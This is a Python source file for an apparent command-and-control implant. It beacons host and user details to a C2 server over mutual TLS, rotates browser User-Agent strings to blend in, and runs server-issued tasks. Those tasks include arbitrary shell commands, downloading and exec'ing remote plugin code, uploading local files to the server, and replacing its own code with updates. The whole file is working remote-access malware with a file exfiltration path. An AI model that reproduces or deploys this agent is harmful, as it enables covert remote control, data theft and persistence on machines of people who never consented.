# ==========================================
# 1. System & OS Standard Libraries
# ==========================================
import getpass
import os
import platform
import socket
import subprocess
import sys
import tempfile
from pathlib import Path

# ==========================================
# 2. Core Functional Standard Libraries
# ==========================================
import hashlib
import importlib.util  # Consolidated duplicate
import json
import random
import textwrap
import time
from datetime import datetime, timezone
from multiprocessing import Process
import threading

# ==========================================
# 3. Third-Party Libraries
# ==========================================
from cryptography.fernet import Fernet
import requests

# ==========================================
# 1. ENDPOINTS & GLOBAL CONSTANTS
# ==========================================
SERVER_URL = "https://c2.local"
LOGIN_ENDPOINT = "/login"
BEACON_ENDPOINT = "/beacon"
RESULT_ENDPOINT = "/result"
UPLOAD_ENDPOINT = "/upload"

AGENT_VERSION = "1.0.3"
SLEEP_MIN = 5
SLEEP_MAX = 10

# Update check mechanisms
UPDATE_CHECK_INTERVAL = 10  # Interval value
UPDATE_FLAG = ".updated_recently"

# Rotational User-Agents for network signatures
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36"
]

# ==========================================
# 2. RUNTIME STATE VARIABLES
# ==========================================
TOKEN = ""
scheduled_tasks = []
config_data = {}

# ==========================================
# 3. PATH & FILE SYSTEM CONFIGURATION
# ==========================================
# Absolute base directory of the current script execution
BASE_DIR = Path(__file__).resolve().parent

# Locate the configuration file dynamically (e.g., /path/to/Agent2.conf)
script_path = os.path.abspath(__file__)
config_file_path = os.path.splitext(script_path)[0] + '.conf'

# Ensure the required local directories exist
os.makedirs(BASE_DIR / "keys", exist_ok=True)

# ==========================================
# 4. CONFIGURATION PARSING (.conf file)
# ==========================================
try:
    with open(config_file_path, 'r') as file:
        for line in file:
            line = line.strip()

            # Skip empty lines or commented configurations
            if not line or line.startswith('#'):
                continue

            # Parse Key-Value pairs split by the first '='
            if '=' in line:
                key, value = line.split('=', 1)

                # Sanitize whitespaces and strip enclosing literal quotes
                key = key.strip()
                value = value.strip().strip('"').strip("'")

                config_data[key] = value

except FileNotFoundError:
    print(f"Error: The configuration file {config_file_path} was not found.")
    # Consider implementing custom defaults or an exit protocol here

# Extract parsed credential configurations
username = config_data.get("username")
password = config_data.get("password")
AGENT_ID = config_data.get("AGENT_ID")
AGENT_GROUP = config_data.get("AGENT_GROUP")

# ==========================================
# 5. CRYPTOGRAPHY INITIALIZATION
# ==========================================
FERNET_KEY = config_data.get("FERNET_KEY")
if FERNET_KEY:
    # Convert string to bytes for Fernet initialization
    cipher = Fernet(FERNET_KEY.encode())
else:
    cipher = None
    print("Warning: FERNET_KEY missing from configuration data.")

# ==========================================
# 6. NETWORK SESSION & TLS SETUP
# ==========================================
session = requests.Session()

# Enforce a custom CA Certificate for server validation
CA_CERT = BASE_DIR / "keys" / "ca.crt"
session.verify = str(CA_CERT)

# Apply dynamic mutual TLS (mTLS) Client Certificates based on AGENT_ID
session.cert = (
    str(BASE_DIR / "keys" / f"agent{AGENT_ID}.crt"),
    str(BASE_DIR / "keys" / f"agent{AGENT_ID}.key")
)

# Set a random default User-Agent for this session context
session.headers.update({"User-Agent": random.choice(USER_AGENTS)})

''' check if mTLS works
def run_mtls_requests():
    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}

    payload = get_system_info()

    encrypted_payload = encrypt_data(json.dumps(payload))

    try:

        response = session.post(
            SERVER_URL + BEACON_ENDPOINT,
            json={"data": encrypted_payload},
            headers=headers
        )

        if response.status_code == 200:
            print("MTLS")

    except requests.exceptions.SSLError as e:
        print("\nPossible causes:\n1. Server doesn't trust the Client CA\n2. Client cert is expired\n3. Wrong CA file provided in 'verify'")
    except requests.exceptions.RequestException as e:
        print(f"Connection Error: {e}")'''


def encrypt_data(data):
    return cipher.encrypt(data.encode()).decode()


def decrypt_data(data):
    return cipher.decrypt(data.encode()).decode()


def get_system_info():
    return {
        "id": AGENT_ID,
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "os": platform.system() + " " + platform.release(),
        "agent_group": AGENT_GROUP,
    }


def login():
    global TOKEN

    payload = {
        "username": username,
        "password": password,
        "agent_id": AGENT_ID
    }

    try:
        response = session.post(
            SERVER_URL + LOGIN_ENDPOINT,
            json=payload,
            timeout=10
        )

        if response.status_code != 200:
            return False

        data = response.json()

        if data.get("status") == "ok":
            TOKEN = data.get("token")

            if not TOKEN:
                return False
            return True

        return False

    except Exception as e:
        print("Login exception:", e)
        return False


def beacon():
    global session
    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}

    payload = get_system_info()

    encrypted_payload = encrypt_data(json.dumps(payload))
    # Create fresh session for this beacon
    temp_session = requests.Session()
    temp_session.verify = str(CA_CERT)
    temp_session.cert = (
        BASE_DIR / "keys" / f"agent{AGENT_ID}.crt",
        BASE_DIR / "keys" / f"agent{AGENT_ID}.key",
    )

    try:

        response = temp_session.post(
            SERVER_URL + BEACON_ENDPOINT,
            json={"data": encrypted_payload},
            headers=headers
        )

        if response.status_code == 200:
            data = response.json()
            # iterates through tasks offered by beacon , Avoids adding same task by filtering through UUID
            if data:
                for item in data:
                    if item["uuid"] not in scheduled_tasks:
                        scheduled_tasks.append(item)
            else:
                return "No tasks"
            # Sorts the tasks by scheduled exec time in an ascending matter
            scheduled_tasks.sort(key=lambda x: x['scheduled_at'], reverse=False)
            # pops first task supposed to be executed
            task_to_run = scheduled_tasks.pop(0)
            print(task_to_run)

            task = task_to_run["task"]
            task_uuid = task_to_run["uuid"]
            scheduled_at = task_to_run["scheduled_at"]

            scheduled_at_cmp = datetime.fromisoformat(scheduled_at)
            current_time = datetime.now(timezone.utc)

            if scheduled_at_cmp <= current_time:
                if task and task_uuid:
                    execute_task(task, task_uuid)

            else:
                print("No tasks to run")

    except Exception as e:
        print(f"[!] Beacon error: {e}")
        return


def execute_task(task, task_uuid):
    task_type = task.get("type")

    print(f"[+] Task Type: {task_type}")

    if task_type == "shell":

        command = task.get("command")
        execute_shell(command, task_uuid)

    elif task_type == "download":

        save_as = task.get("save_as")
        url = task.get("url")
        download_file(url, save_as, task_uuid)

    elif task_type == "upload":

        path_to_file = task.get("path_to_file")
        upload_file(path_to_file, task_uuid)

    elif task_type == "sleep":

        global SLEEP_MIN, SLEEP_MAX

        SLEEP_MIN = task.get("min", SLEEP_MIN)
        SLEEP_MAX = task.get("max", SLEEP_MAX)

        print(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds")
        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        post_result(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds", task_uuid, executed_at)


last_update_check = None
update_lock = threading.Lock()


def check_for_update():
    """Check for update without terminating on failure"""
    agent_file = os.path.abspath(__file__)
    update_url = SERVER_URL + "/agent_update"
    print("[*] Checking for update...")
    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
    payload = {"version": AGENT_VERSION, "id": AGENT_ID}
    encrypted_payload = encrypt_data(json.dumps(payload))

    try:
        response = session.post(update_url, headers=headers, json=payload, timeout=10)
        response.raise_for_status()
        data = response.json()

        if not data.get("update", False):
            print("[*] No update available.")
            return True  # Return True to indicate successful check

        print("[+] Update found!")
        download_url = SERVER_URL + data["download_url"]
        expected_hash = data["sha256"]

        try:
            download_update(download_url, expected_hash)
            return True
        except Exception as e:
            print(f"[!] Update download/verification failed: {e}")
            return False

    except requests.exceptions.Timeout:
        print("[!] Update check timed out (server not responding)")
        return False
    except requests.exceptions.ConnectionError:
        print("[!] Update check failed: Connection error (server may be down)")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Update check failed: {e}")
        return False
    except Exception as e:
        print(f"[!] Unexpected error during update check: {e}")
        return False


def download_update(download_url, expected_hash):
    """Download and verify update"""
    headers = {"TOKEN": TOKEN, "USER-AGENT": random.choice(USER_AGENTS)}
    response = session.get(download_url, headers=headers, allow_redirects=False, timeout=30)
    response.raise_for_status()
    new_file = "agent_new.py"

    with open(new_file, "wb") as f:
        f.write(response.content)

    verify_hash(new_file, expected_hash)
    launch_updater(new_file)


def verify_hash(filepath, expected_hash):
    """Verify SHA256 hash of downloaded file"""
    sha256 = hashlib.sha256()
    with open(filepath, "rb") as f:
        while chunk := f.read(8192):
            sha256.update(chunk)
    actual_hash = sha256.hexdigest()

    if actual_hash != expected_hash:
        os.remove(filepath)  # Clean up bad file
        raise Exception(f"Hash mismatch! Expected {expected_hash}, got {actual_hash}")

    print("[+] Hash verified.")


def launch_updater(new_file):
    """Launch updater subprocess"""
    current_file = os.path.abspath(__file__)
    updater_code = textwrap.dedent("""
        import sys
        import os
        import shutil
        import subprocess
        import time

        current_file = sys.argv[1]
        new_file = sys.argv[2]
        backup_file = current_file + ".bak"

        time.sleep(2)

        try:
            print("[*] Replacing agent...")
            # backup old
            if os.path.exists(backup_file):
                os.remove(backup_file)
            shutil.move(current_file, backup_file)

            # install new
            shutil.move(new_file, current_file)

            # create update flag
            flag_file = os.path.join(
                os.path.dirname(current_file),
                ".updated_recently"
            )
            with open(flag_file, "w") as f:
                f.write("updated")

            print("[+] Restarting updated agent...")
            subprocess.Popen([
                sys.executable,
                current_file
            ])
            print("[+] Update successful.")

        except Exception as e:
            print(f"[!] Update failed: {e}")
            if os.path.exists(backup_file):
                shutil.move(backup_file, current_file)
            os._exit(1)
    """)

    with tempfile.NamedTemporaryFile(
            "w",
            delete=False,
            suffix=".py"
    ) as tmp_file:
        tmp_file.write(updater_code)
        updater_path = tmp_file.name

    subprocess.Popen([
        sys.executable,
        updater_path,
        current_file,
        new_file
    ])

    print("[*] Updater launched. Exiting agent.")
    sys.exit(0)


def periodic_update_checker():
    """
    Background thread that checks for updates every UPDATE_CHECK_INTERVAL seconds.
    This runs independently from the main beacon loop.
    """
    global last_update_check

    print("[*] Update checker thread started")

    while True:
        try:
            with update_lock:
                current_time = time.time()

                # Check if enough time has passed since last check
                if last_update_check is None or (current_time - last_update_check) >= UPDATE_CHECK_INTERVAL:
                    print(f"\n[*] Performing scheduled update check at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                    check_for_update()
                    last_update_check = current_time

            # Sleep for a short interval before checking the timer again
            time.sleep(60)  # Check every 60 seconds if it's time for an update check

        except Exception as e:
            print(f"[!] Error in update checker thread: {e}")
            time.sleep(60)


def execute_shell(command, task_uuid):
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.PIPE,
            text=True,
            bufsize=1
        )

        collected_output = []

        try:
            for line in process.stdout:
                if not line:
                    break
                print(line, end="")
                collected_output.append(line)

            if process.poll() is not None:
                print("[!] Connection closed by remote host.")

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")

        finally:
            process.kill()
            if "Netcat.py" in command:
                print("[*] Connection terminated.")

        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")

        # Join collected output into a single string
        final_output = "".join(collected_output)

        post_result(f"[+] Executed:{final_output}", task_uuid, executed_at)

    except Exception as e:
        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        post_result(f"[!] Error: {str(e)}", task_uuid, executed_at)


# 1. Move the inner function to the top level
def execute_plugin(content, module_name, task_uuid):
    """This function is now picklable because it is at the top level."""
    try:
        spec = importlib.util.spec_from_loader(module_name, loader=None)
        module = importlib.util.module_from_spec(spec)

        # Execute the code within the module's namespace
        exec(content, module.__dict__)
        sys.modules[module_name] = module

        if hasattr(module, "run"):
            module.run()
            executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            print(f"[+] Plugin '{module_name}' executed successfully")
            post_result(f"[+] Plugin '{module_name}' executed", task_uuid, executed_at)
        else:
            print(f"[!] Plugin '{module_name}' has no run() function")
            executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            post_result(f"[!] Error: Plugin '{module_name}' has no run() function", task_uuid, executed_at)

    except Exception as e:
        print(f"[!] Plugin '{module_name}' crashed: {e}")
        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        post_result(f"[!] Error: Plugin '{module_name}' crashed: {e}", task_uuid, executed_at)


def download_file(url, save_as=None, task_uuid=None):
    try:
        print(f"[+] Downloading {url}")
        headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
        if SERVER_URL in url:
            r = session.get(url, headers=headers)  # Uses your custom mTLS session
        else:
            r = requests.get(url)
        r.raise_for_status()

        if "/plugins" in url:
            content = r.text.replace("\r\n", "\n")
            module_name = url.split("/")[-1].replace(".py", "")

            # 2. Pass arguments to the top-level function via 'args'
            p = Process(
                target=execute_plugin,
                args=(content, module_name, task_uuid)
            )
            p.start()
            p.join(timeout=10)

            if p.is_alive():
                print(f"[!] Plugin '{module_name}' timed out, terminating...")
                p.terminate()
                p.join()
                executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
                post_result(f"[!] Error: Plugin '{module_name}' aborted due to timeout", task_uuid, executed_at)
        else:
            if save_as is None:
                save_as = url.split("/")[-1]
            with open(save_as, "wb") as f:
                f.write(r.content)
            executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            post_result(f"Downloaded file {save_as}", task_uuid, executed_at)

    except Exception as e:
        print(f"[!] Error: download failed {url}: {e}")
        if task_uuid:
            executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            post_result(f"[!] Error: {e}", task_uuid, executed_at)


def upload_file(path_to_file, task_uuid):
    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}

    try:

        with open(path_to_file, "rb") as file:

            files = {"file": file}

            data = {"agent_id": AGENT_ID}

            response = session.post(
                SERVER_URL + UPLOAD_ENDPOINT,
                headers=headers,
                files=files,
                data=data
            )
        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        post_result(
            f"[+] Uploaded {path_to_file} ({response.status_code})",
            task_uuid, executed_at
        )

    except Exception as e:

        print(f"[!] Upload error: {e}")
        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        post_result(f"[!] Error: Failed to upload : {e}", task_uuid, executed_at)


def post_result(result, task_uuid, executed_at=None):
    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}

    payload = {
        "id": AGENT_ID,
        "output": result,
        "uuid": task_uuid,
        "executed_at": executed_at
    }

    encrypted_payload = encrypt_data(json.dumps(payload))

    try:

        session.post(
            SERVER_URL + RESULT_ENDPOINT,
            json={"data": encrypted_payload},
            headers=headers
        )

    except Exception as e:

        print(f"[!] Result posting error: {e}")


def main():
    """Main agent loop"""
    print(f"[*] Agent starting at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Update check interval: {UPDATE_CHECK_INTERVAL // 3600} hours")
    print(f"[*] Verify mode: {session.verify}")

    # Try to authenticate
    attempts = 0
    while attempts < 5:
        if login():
            print("[+] Agent authenticated")
            break
        else:
            attempts += 1
            print(f"[!] Agent login failed (attempt {attempts}/5)")
            time.sleep(3)
    else:
        print("[!] Max login attempts reached. Exiting...")
        return

    # Start the update checker thread as a daemon
    # This makes it terminate when the main program exits
    update_thread = threading.Thread(target=periodic_update_checker, daemon=True)
    update_thread.start()
    print("[+] Update checker thread started")

    # Check if this is a fresh restart after update
    if os.path.exists(UPDATE_FLAG):
        print("[+] Agent was recently updated")
        os.remove(UPDATE_FLAG)

    # Main beacon loop
    print("[+] Entering main beacon loop")

    try:
        while True:
            beacon()

            sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
            print(f"[*] Sleeping {sleep_time} seconds...")
            time.sleep(sleep_time)

    except KeyboardInterrupt:
        print("\n[*] Agent interrupted by user (Ctrl+C)")
        print("[*] Shutting down gracefully...")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Unexpected error in main loop: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
